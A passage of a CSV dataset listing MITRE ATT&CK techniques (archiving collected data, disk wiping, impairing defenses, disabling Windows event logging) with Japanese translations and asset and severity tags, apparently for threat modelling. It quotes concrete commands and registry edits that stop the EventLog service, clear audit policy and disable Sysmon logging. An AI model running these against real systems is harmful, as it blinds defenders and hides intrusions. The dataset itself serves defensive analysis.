Escalation](https://attack.mitre.org/techniques/T1068).",攻撃者は、XPC サービスデーモンに悪意のあるコンテンツを提供して、ローカルでコードを実行することができます。macOS は、XPC サービスデーモンとサードパーティのアプリケーション特権ヘルパーツールなど、さまざまなプロセス間の基本的なプロセス間通信に XPC サービスを使用しています。 アプリケーションは、昇格された特権を必要とするタスク（ネットワーク接続など）を処理するために、root として実行される XPC サービスデーモンに、低レベルの XPC サービス <code>C API</code> または高レベルの <code>NSXPCConnection API</code> を使用してメッセージを送信できます。 アプリケーションは、XPCサービスの設計図となるプロトコル定義を提供する責任を負います。開発者は通常、アプリケーションの安定性とクライアント／デーモン間の特権分離を実現するためにXPCサービスを利用します。(引用: creatingXPCservices)(引用: Designing Daemons Apple Dev) 攻撃者はXPCサービスを悪用して悪意のあるコンテンツを実行可能です。 悪意のある実行要求は、アプリケーションのXPCサービスハンドラーを介して渡される可能性があります。(引用: CVMServer Vuln)(引用: Learn XPC Exploitation) これには、不適切なXPCクライアント検証や入力パラメータの不十分なサニタイズを特定・悪用して、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)を行うことも含まれます。,execution,macOS,other,foothold,privileged_account;endpoint_execution;network_connectivity;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--8252f135-ed26-4ce1-ae61-f26e94429a19,2021-10-12T06:45:36.763Z,2025-04-15T19:58:47.031Z,,,,
T1560,,Archive Collected Data,収集データのアーカイブ化,"An adversary may compress and/or encrypt data that is collected prior to exfiltration. Compressing the data can help to obfuscate the collected data and minimize the amount of data sent over the network.(Citation: DOJ GRU Indictment Jul 2018) Encryption can be used to hide information that is being exfiltrated from detection or make exfiltration less conspicuous upon inspection by a defender. Both compression and encryption are done prior to exfiltration, and can be performed using a utility, 3rd party library, or custom method.",攻撃者は、漏洩前に収集したデータを圧縮および／または暗号化する場合がある。データの圧縮は収集データの難読化とネットワーク経由送信量の最小化に寄与する。(出典: DOJ GRU Indictment Jul 2018) 暗号化は、漏洩中の情報を検知から隠蔽したり、防御者による検査時に漏洩を目立たなくしたりするために使用される。 圧縮と暗号化の両方は情報漏洩前に実施され、ユーティリティ、サードパーティ製ライブラリ、またはカスタム手法を用いて実行される。,collection,Linux;macOS;Windows,data_collection,asset_access,network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--53ac20cd-aca3-406e-9aa0-9fc7fdc60a5a,2020-02-20T20:53:45.725Z,2025-04-15T21:50:30.319Z,,,,
T1560.001,T1560,Archive via Utility,ユーティリティによるアーカイブ,"Adversaries may use utilities to compress and/or encrypt collected data prior to exfiltration. Many utilities include functionalities to compress, encrypt, or otherwise package data into a format that is easier/more secure to transport. Adversaries may abuse various utilities to compress or encrypt data before exfiltration. Some third party utilities may be preinstalled, such as <code>tar</code> on Linux and macOS or <code>zip</code> on Windows systems. On Windows, <code>diantz</code> or <code> makecab</code> may be used to package collected files into a cabinet (.cab) file. <code>diantz</code> may also be used to download and compress files from remote locations (i.e. [Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)).(Citation: diantz.exe_lolbas) <code>xcopy</code> on Windows can copy files and directories with a variety of options. Additionally, adversaries may use [certutil](https://attack.mitre.org/software/S0160) to Base64 encode collected data before exfiltration. Adversaries may use also third party utilities, such as 7-Zip, WinRAR, and WinZip, to perform similar activities.(Citation: 7zip Homepage)(Citation: WinRAR Homepage)(Citation: WinZip Homepage)",攻撃者は、収集したデータを流出前に圧縮および/または暗号化するためにユーティリティを使用する場合がある。多くのユーティリティには、データを圧縮、暗号化、または輸送が容易/安全な形式にパッケージ化する機能が含まれている。攻撃者は、流出前にデータを圧縮または暗号化するために様々なユーティリティを悪用する可能性がある。LinuxやmacOS上の<code>tar</code>、Windowsシステム上の<code>zip</code>など、一部のサードパーティ製ユーティリティはプリインストールされている場合がある。 Windowsでは、<code>diantz</code>や<code>makecab</code>を使用して収集したファイルをキャビネット(.cab)ファイルにパッケージ化することがある。 <code>diantz</code> は、リモートロケーションからのファイルダウンロードや圧縮にも使用できます（例：[Remote Data Staging](https://attack.mitre.org/techniques/T1074/002)）。(引用元: diantz.exe_lolbas)Windows の <code>xcopy</code> は、様々なオプションでファイルやディレクトリをコピーできます。 さらに、攻撃者は収集したデータを漏洩前にBase64エンコードするために[certutil](https://attack.mitre.org/software/S0160)を使用する可能性があります。 攻撃者は、7-Zip、WinRAR、WinZip などのサードパーティ製ユーティリティを使用して、同様の活動を行う場合もあります。(引用元: 7zip ホームページ)(引用元: WinRAR ホームページ)(引用元: WinZip ホームページ),collection,Linux;Windows;macOS,data_collection,asset_access,network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--00f90846-cbd1-4fc5-9233-df5c2bf2a662,2020-02-20T21:01:25.428Z,2025-04-15T21:51:23.078Z,,,,
T1560.002,T1560,Archive via Library,ライブラリ経由のアーカイブ化,"An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party libraries. Many libraries exist that can archive data, including [Python](https://attack.mitre.org/techniques/T1059/006) rarfile (Citation: PyPI RAR), libzip (Citation: libzip), and zlib (Citation: Zlib Github). Most libraries include functionality to encrypt and/or compress data. Some archival libraries are preinstalled on systems, such as bzip2 on macOS and Linux, and zip on Windows. Note that the libraries are different from the utilities. The libraries can be linked against when compiling, while the utilities require spawning a subshell, or a similar execution mechanism.",攻撃者は、収集したデータを漏洩前にサードパーティ製ライブラリを用いて圧縮または暗号化する場合がある。データアーカイブ機能を持つライブラリは多数存在し、[Python](https://attack.mitre.org/techniques/T1059/006) のrarfile（引用元: PyPI RAR）、libzip（引用元: libzip）、zlib （引用元: Zlib Github）などがあります。ほとんどのライブラリには、データを暗号化および/または圧縮する機能が含まれています。一部のアーカイブライブラリは、macOSやLinuxのbzip2、Windowsのzipなど、システムにプリインストールされています。ライブラリはユーティリティとは異なることに注意してください。ライブラリはコンパイル時にリンクできますが、ユーティリティはサブシェルや同様の実行メカニズムを起動する必要があります。,collection,Linux;macOS;Windows,script_command_execution,asset_access,user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--41868330-6ee2-4d0f-b743-9f2294c3c9b6,2020-02-20T21:08:52.529Z,2025-04-15T21:51:09.003Z,,,,
T1560.003,T1560,Archive via Custom Method,カスタム手法によるアーカイブ化,"An adversary may compress or encrypt data that is collected prior to exfiltration using a custom method. Adversaries may choose to use custom archival methods, such as encryption with XOR or stream ciphers implemented with no external library or utility references. Custom implementations of well-known compression algorithms have also been used.(Citation: ESET Sednit Part 2)",攻撃者は、漏洩前に収集したデータをカスタム手法で圧縮または暗号化する場合がある。外部ライブラリやユーティリティを参照せずに実装されたXOR暗号化やストリーム暗号など、カスタムアーカイブ手法を選択する可能性がある。既知の圧縮アルゴリズムのカスタム実装も使用例がある。(引用元: ESET Sednit Part 2),collection,Linux;macOS;Windows,data_collection,asset_access,,unknown,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0009,attack-pattern--143c0cbb-a297-4142-9624-87ffc778980b,2020-02-20T21:09:55.995Z,2025-04-15T21:50:49.814Z,,,,
T1561,,Disk Wipe,ディスクワイプ,"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and/or wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted. To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware) On network devices, adversaries may wipe configuration files and other data from the device using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `erase`.(Citation: erase_cmd_cisco)",攻撃者は、システムやネットワークリソースへのアクセスを妨害するため、特定システムまたはネットワーク内の大量のディスクデータを消去または破損させる可能性がある。ディスクへの直接書き込みアクセス権限を持つ攻撃者は、ディスクデータの一部を上書きしようとする。攻撃者は、ディスクデータの任意の部分を消去したり、マスターブートレコード（MBR）などのディスク構造を消去したりする選択肢がある。 全ディスクセクタの完全消去が試みられる場合もある。ネットワーク全体の可用性中断を目的とする作戦において標的組織への影響を最大化するため、ディスク消去用マルウェアはワーム的特徴を備え、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)などの追加手法を活用してネットワーク全体に拡散するワーム的特性を持つ場合があります。(引用: Novetta Blockbuster Destructive Malware) ネットワークデバイスでは、攻撃者は`erase`などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを用いて、設定ファイルやその他のデータをデバイスから消去する可能性がある。(引用: erase_cmd_cisco),impact,Linux;macOS;Windows;Network Devices,credential_abuse,impact,authentication_system;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--1988cc35-ced8-4dad-b2d1-7628488fa967,2020-02-20T22:02:20.372Z,2025-04-15T19:58:09.974Z,,,,
T1561.001,T1561,Disk Content Wipe,ディスク内容の消去,"Adversaries may erase the contents of storage devices on specific systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may partially or completely overwrite the contents of a storage device rendering the data irrecoverable through the storage interface.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware)(Citation: DOJ Lazarus Sony 2018) Instead of wiping specific disk structures or files, adversaries with destructive intent may wipe arbitrary portions of disk content. To wipe disk content, adversaries may acquire direct access to the hard drive in order to overwrite arbitrarily sized portions of disk with random data.(Citation: Novetta Blockbuster Destructive Malware) Adversaries have also been observed leveraging third-party drivers like [RawDisk](https://attack.mitre.org/software/S0364) to directly access disk content.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Destructive Malware) This behavior is distinct from [Data Destruction](https://attack.mitre.org/techniques/T1485) because sections of the disk are erased instead of individual files. To maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disk content may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Novetta Blockbuster Destructive Malware)",攻撃者は、特定のシステムまたはネットワーク内の多数のストレージデバイスの内容を消去し、システムおよびネットワークリソースへのアクセスを妨害する可能性がある。 攻撃者は、ストレージインターフェース経由でのデータ復元を不可能にするため、ストレージデバイス内容を部分的または完全に上書きする可能性があります。(引用: Novetta Blockbuster)(引用: Novetta Blockbuster Destructive Malware)(引用: DOJ Lazarus Sony 2018) 特定のディスク構造やファイルを消去する代わりに、破壊的意図を持つ攻撃者はディスク内容の任意の部分を消去する可能性があります。 ディスク内容を消去するため、敵対者はハードドライブへの直接アクセス権を取得し、ランダムデータで任意サイズの領域を上書きすることがある（引用：Novetta Blockbuster 破壊的マルウェア）。また、[RawDisk](https://attack.mitre.org/software/S0364)のようなサードパーティ製ドライバーを利用してディスク内容に直接アクセスする事例も確認されている。(引用元: Novetta Blockbuster)(引用元: Novetta Blockbuster Destructive Malware) この動作は、個々のファイルではなくディスクのセクション全体が消去される点で、[Data Destruction](https://attack.mitre.org/techniques/T1485) とは異なります。 ネットワーク全体の可用性中断を目的とする作戦において標的組織への影響を最大化するため、ディスク内容消去用マルウェアはワーム的特徴を有し、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)などの追加手法を活用してネットワーク全体に拡散するワーム的特性を持つ場合があります。（出典：Novetta Blockbuster Destructive Malware）,impact,Linux;Network Devices;Windows;macOS,credential_abuse,impact,authentication_system;network_connectivity;file_storage_access,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--fb640c43-aa6b-431e-a961-a279010424ac,2020-02-20T22:06:41.739Z,2025-04-15T19:59:23.834Z,,,,
T1561.002,T1561,Disk Structure Wipe,ディスク構造の消去,"Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. Adversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped. On a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco) To maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",攻撃者は、システムの起動に必要なハードドライブ上のディスクデータ構造を破壊または消去する可能性があります。特定の重要システムを標的とするか、ネットワーク内で大量に攻撃を仕掛けることで、システムおよびネットワークリソースへのアクセスを妨害します。攻撃者は、マスターブートレコード（MBR）やパーティションテーブルなどの構造内に存在する重要データを上書きすることで、システムの起動不能化を試みる場合があります。(出典: Symantec Shamoon 2012)(出典: FireEye Shamoon Nov 2016)(出典: Palo Alto Shamoon Nov 2016)(出典: Kaspersky StoneDrill 2017)(出典: Unit 42 Shamoon3 2018) ディスク構造に含まれるデータには、オペレーティングシステムをロードするための初期実行コードや、ディスク上のファイルシステムパーティションの位置情報が含まれる場合があります。この情報が存在しない場合、コンピュータは起動プロセス中にオペレーティングシステムをロードできず、使用不能になります。 [ディスク構造ワイプ](https://attack.mitre.org/techniques/T1561/002)は単独で実行される場合もあれば、ディスクの全セクタを消去する[ディスク内容ワイプ](https://attack.mitre.org/techniques/T1561/001)と併せて実行される場合もある。 ネットワークデバイスでは、攻撃者が`format`などの[ネットワークデバイスCLI](https://attack.mitre.org/techniques/T1059/008)コマンドを使用してファイルシステムを再フォーマットする可能性があります。(引用: format_cmd_cisco) 標的組織への影響を最大化するため、ディスク構造破壊を目的としたマルウェアはワーム的特徴を持ち、[有効なアカウント](https://attack.mitre.org/techniques/T1078)、 [OS認証情報ダンプ](https://attack.mitre.org/techniques/T1003)、[SMB/Windows管理共有](https://attack.mitre.org/techniques/T1021/002)などの手法を組み合わせてネットワーク上へ拡散するワーム的特性を持つ場合があります。(引用元: Symantec Shamoon 2012)(引用元: FireEye Shamoon Nov 2016)(引用元: Palo Alto Shamoon Nov 2016)(引用元: Kaspersky StoneDrill 2017),impact,Linux;macOS;Windows;Network Devices,credential_abuse,impact,authentication_system;endpoint_execution;network_connectivity;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;My Number Administrative System on GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9,2020-02-20T22:10:20.484Z,2025-04-15T19:58:04.838Z,,,,
T1562,,Impair Defenses,防御機能の妨害,"Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and anti-virus, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators. Adversaries may also impair routine operations that contribute to defensive hygiene, such as blocking users from logging out, preventing a system from shutting down, or disabling or modifying the update process. Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components. These restrictions can further enable malicious operations as well as the continued propagation of incidents.(Citation: Google Cloud Mandiant UNC3886 2024)(Citation: Emotet shutdown)",攻撃者は、防御メカニズムを妨害または無効化するために、被害者環境のコンポーネントを悪意を持って改変する場合があります。これは、ファイアウォールやアンチウイルスなどの予防的防御を損なうだけでなく、防御側が活動を監査し悪意のある行動を特定するために使用する検出機能にも及びます。また、ネイティブ防御と、ユーザーや管理者がインストールした補助機能の両方に及ぶ可能性があります。 攻撃者は、防御衛生に寄与する日常的な運用を妨害することもある。例：ユーザーのログアウトをブロックする、システムのシャットダウンを阻止する、更新プロセスを無効化または改変する。 攻撃者はイベント集約・分析メカニズムを標的とするか、他のシステムコンポーネントを変更してこれらの手順を妨害する可能性もある。こうした制限は悪意ある操作をさらに可能にし、インシデントの継続的な拡散を助長する。(引用: Google Cloud Mandiant UNC3886 2024)(引用: Emotet shutdown),defense-evasion,Windows;IaaS;Linux;macOS;Containers;Network Devices;Identity Provider;Office Suite;ESXi,defense_disable,stealth,privileged_account;user_interaction;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Business Workstation;Identity / SaaS (IdP/SSO);Log / Monitoring Server;Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3d333250-30e4-4a82-9edc-756c68afc529,2020-02-21T20:22:13.470Z,2025-04-15T19:58:24.596Z,,,,
T1562.001,T1562,Disable or Modify Tools,ツールの無効化または変更,"Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information. Adversaries may also disable updates to prevent the latest security patches from reaching tools on victim systems.(Citation: SCADAfence_ransomware) Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events. For example, security products may load their own modules and/or modify those loaded by processes to facilitate data collection. Similar to [Indicator Blocking](https://attack.mitre.org/techniques/T1562/006), adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection.(Citation: OutFlank System Calls)(Citation: MDSec System Calls) Alternatively, they may add new directories to an endpoint detection and response (EDR) tool’s exclusion list, enabling them to hide malicious files via [File/Path Exclusions](https://attack.mitre.org/techniques/T1564/012).(Citation: BlackBerry WhisperGate 2022)(Citation: Google Cloud Threat Intelligence FIN13 2021) Adversaries may also focus on specific applications such as Sysmon. For example, the “Start Eand “Enable Evalues in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> may be modified to tamper with and potentially disable Sysmon logging.(Citation: disable_win_evt_logging) On network devices, adversaries may attempt to skip digital signature verification checks by altering startup configuration files and effectively disabling firmware verification that typically occurs at boot.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(Citation: Analysis of FG-IR-22-369) In cloud environments, tools disabled by adversaries may include cloud monitoring agents that report back to services such as AWS CloudWatch or Google Cloud Monitor. Furthermore, although defensive tools may have anti-tampering mechanisms, adversaries may abuse tools such as legitimate rootkit removal kits to impair and/or disable these tools.(Citation: chasing_avaddon_ransomware)(Citation: dharma_ransomware)(Citation: demystifying_ryuk)(Citation: doppelpaymer_crowdstrike) For example, adversaries have used tools such as GMER to find and shut down hidden processes and antivirus software on infected systems.(Citation: demystifying_ryuk) Additionally, adversaries may exploit legitimate drivers from anti-virus software to gain access to kernel space (i.e. [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068)), which may lead to bypassing anti-tampering features.(Citation: avoslocker_ransomware)",攻撃者は、マルウェア/ツールや活動の検知回避を目的として、セキュリティツールを改変または無効化する場合がある。これには、セキュリティソフトウェアのプロセスやサービスを強制終了させる、レジストリキーや設定ファイルを改変/削除してツールの正常動作を妨げる、セキュリティツールのスキャンや情報報告を妨害するその他の手法など、多様な形態が存在する。 攻撃者は、被害者システム上のツールに最新のセキュリティパッチが届くのを防ぐため、更新を無効化することもある。(引用: SCADAfence_ransomware)攻撃者は、セキュリティツールが展開・利用するアーティファクトを改ざんすることもある。セキュリティツールは、特定のイベントに対する可視性を維持するため、システムコンポーネントに動的な変更を加えることがある。 例えば、セキュリティ製品はデータ収集を容易にするため、独自のモジュールをロードしたり、プロセスによってロードされたモジュールを変更したりすることがあります。[インジケーターブロック](https://attack.mitre.org/techniques/T1562/006)と同様に、攻撃者は検出を回避するため、ツールによって追加されたこれらの機能（特にユーザーランドに存在するか、攻撃者がアクセス可能なもの）をアンフックしたり、その他の方法で変更したりすることがあります。(引用: OutFlank System Calls)(引用: MDSec System Calls) あるいは、エンドポイント検知対応ツール（EDR）の除外リストに新規ディレクトリを追加し、[ファイル/パス除外](https://attack.mitre.org/techniques/T1564/012) を通じて悪意のあるファイルを隠蔽する手法も用いられる。(引用: BlackBerry WhisperGate 2022)(引用: Google Cloud Threat Intelligence FIN13 2021) 敵対者は、Sysmon などの特定のアプリケーションに焦点を当てる場合もあります。 たとえば、<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Microsoft-Windows-Sysmon-Operational</code> 内の「Start」および「Enable」の値が変更され、Sysmon のログ記録が改ざんされ、場合によっては無効化される可能性があります。(引用: disable_win_evt_logging) ネットワークデバイスでは、攻撃者は起動構成ファイルを変更し、通常ブート時に実行されるファームウェア検証を事実上無効化することで、デジタル署名検証チェックを回避しようとする可能性がある。(引用: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)(引用: Analysis of FG-IR-22-369) クラウド環境では、攻撃者によって無効化されるツールには、AWS CloudWatchやGoogle Cloud Monitorなどのサービスに報告するクラウド監視エージェントが含まれる可能性があります。さらに、防御ツールには改ざん防止機構が備わっている場合でも、攻撃者は正規のルートキット除去キットなどのツールを悪用して、これらのツールを損なったり無効化したりする可能性があります。(引用: chasing_avaddon_ransomware)(引用: dharma_ransomware)(引用: demystifying_ryuk)(引用: doppelpaymer_crowdstrike) 例えば、攻撃者は GMER などのツールを使用して、感染システム上で隠されたプロセスやアンチウイルスソフトウェアを発見し、シャットダウンしています。(引用: demystifying_ryuk) さらに、攻撃者はアンチウイルスソフトウェアの正当なドライバーを悪用してカーネル空間へのアクセス権を取得し（例: [権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)）、改ざん防止機能を回避する可能性があります。(引用: avoslocker_ransomware),defense-evasion,Windows;macOS;Linux;Containers;IaaS;Network Devices,config_policy_manipulation,stealth,privileged_account;user_interaction;endpoint_execution;network_connectivity;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Network Device (FW/Proxy/AP);Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--ac08589e-ee59-4935-8667-d845e38fe579,2020-02-21T20:32:20.810Z,2025-04-15T19:58:57.147Z,,,,
T1562.002,T1562,Disable Windows Event Logging,Windowsイベントログの無効化,"Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections. The EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\Local Policies\Audit Policy</code> for basic audit policy settings or <code>Security Settings\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol) Adversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the “Start Evalue in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging) There are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the ""Start"" value in the key <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging) Additionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:”Account Logon E/success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco) By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",攻撃者は、検出や監査に利用可能なデータを制限するため、Windows イベント ログを記録しないように設定する場合があります。 Windowsイベントログは、ログイン試行、プロセス作成など、ユーザーおよびシステムの活動を記録します。(引用元: Windows Log Events) このデータは、セキュリティツールやアナリストが検知を生成するために使用されます。EventLogサービスは、様々なシステムコンポーネントやアプリケーションからのイベントログを管理します。(引用元: EventLog_Core_Technologies) デフォルトでは、システム起動時に自動的に開始されます。 ローカルセキュリティポリシー（secpol.msc）で管理される監査ポリシーは、EventLogサービスが記録するシステムイベントを定義します。セキュリティ監査ポリシー設定は、secpol.mscを実行し、基本設定の場合は<code>セキュリティ設定\ローカルポリシー\監査ポリシー</code>へ、詳細設定の場合は<code>セキュリティ設定\詳細監査ポリシー構成</code>へ移動して変更できます。(引用: Audit_Policy_Microsoft)(引用: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> を使用して監査ポリシーを設定することもできます。(引用: auditpol) 攻撃者は、システム全体のログ、あるいは特定のアプリケーションのログだけを標的にする場合があります。 たとえば、Windows EventLog サービスは、<code>Set-Service -Name EventLog -Status Stopped</code> または <code>sc config eventlog start=disabled</code> コマンド（その後、<code>Stop-Service -Name EventLog</code> を使用して手動でサービスを停止）を使用して無効化できます。(引用元: Disable_Win_Event_Logging)(引用元: disable_win_evt_logging) さらに、<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\EventLog</code> 内の「Start」値を変更し、変更を有効にするためにシステムを再起動することで、このサービスを無効化することも可能です。(引用元: disable_win_evt_logging) レジストリキーの変更によりEventLogサービスを無効化する方法は複数存在する。第一に、管理者権限を持たない攻撃者は、<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Security</code>キー内の「Start」値を変更し、システムを再起動することでセキュリティイベントログを無効化できる。(引用元: winser19_file_overwrite_bug_twitter) 第二に、管理者権限を持つ攻撃者は、<code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-System</code> および <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\WMI\Autologger\EventLog-Application</code> 内の同じ値を変更することで、イベントログ全体を無効化できます。(引用元: disable_win_evt_logging) さらに、攻撃者はコマンドプロンプトで <code>auditpol</code> およびそのサブコマンドを使用し、監査を無効化したり監査ポリシーをクリアしたりする可能性があります。 特定の設定や監査カテゴリを有効化/無効化するには、攻撃者は<code>/success</code>または<code>/failure</code>パラメータを使用する可能性があります。例えば、<code>auditpol /set /category:”Account Logon E/success:disable /failure:disable</code>はアカウントログオンカテゴリの監査を無効化します。(引用元: auditpol.exe_STRONTIC)(引用元: T1562.002_redcanaryco) 監査ポリシーをクリアするには、攻撃者は以下のコマンドを実行する可能性があります: <code>auditpol /clear /y</code> または <code>auditpol /remove /allusers</code>。(引用元: T1562.002_redcanaryco) Windows イベント 